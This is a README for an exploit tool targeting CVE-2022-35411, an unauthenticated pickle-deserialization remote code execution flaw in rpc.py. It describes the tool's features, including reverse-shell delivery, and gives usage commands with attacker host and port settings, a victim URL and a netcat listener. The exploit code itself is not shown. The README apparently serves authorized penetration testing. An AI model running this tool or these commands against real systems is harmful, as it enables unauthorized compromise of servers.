# rpc.py RCE Exploit (CVE-2022-35411)

This is an updated and improved exploit for **CVE-2022-35411**, targeting vulnerable versions of [rpc.py](https://github.com/abersheeran/rpc.py) (`<= 0.6.0`).  
It allows **unauthenticated remote code execution (RCE)** via Python `pickle` deserialization.

> **Original exploit by**: [Elias Hohl](https://github.com/eliashohl)  
> **Enhanced by**: [x7331](https://github.com/x7331) for usability, portability, and automation

---

## Vulnerability Summary

The vulnerability lies in rpc.py's unsafe usage of Python's `pickle` module, allowing crafted payloads to execute arbitrary commands **without authentication**.

- **CVE ID**: [CVE-2022-35411](https://nvd.nist.gov/vuln/detail/CVE-2022-35411)
- **Affected Versions**: rpc.py `v0.4.2` – `v0.6.0`
- **Exploit Type**: Unauthenticated Remote Code Execution (RCE)

---

## Changes

- ✅ Switched to `argparse` with `--lhost`, `--lport`, `--target`, and `--dry-run` flags
- ✅ Clean, modular code structure
- ✅ Optional reverse shell delivery (TCP Bash)
- ✅ Curl test payload (safe mode)
- ✅ Logging support and cleaner output
- ✅ Proper usage guidance via `-h` / `--help`
- ✅ Metadata and inline comments for clarity

---

## Usage

### Reverse Shell Example
```bash
python3 rpc-rce.py --lhost 10.10.14.1 --lport 9001
```
### Dry Run (no shell, just curl test)
```bash
python3 rpc-rce.py --lhost 10.10.14.1 --lport 9001 --dry-run
```
### Custom Target (optional)
```bash
python3 rpc-rce.py --lhost 10.10.14.1 --lport 9001 --target http://victim.internal:65432/sayhi
```
## Requirements
- Python `3.x`
- `requests` library (install with pip install requests)
- A listener on your LHOST (e.g., `nc -lvnp 9001`)
- Vulnerable rpc.py server running

## Legal & Ethical Notice
This exploit is provided for educational and authorized testing purposes only.
Do NOT use it on systems you do not own or lack explicit permission to test.
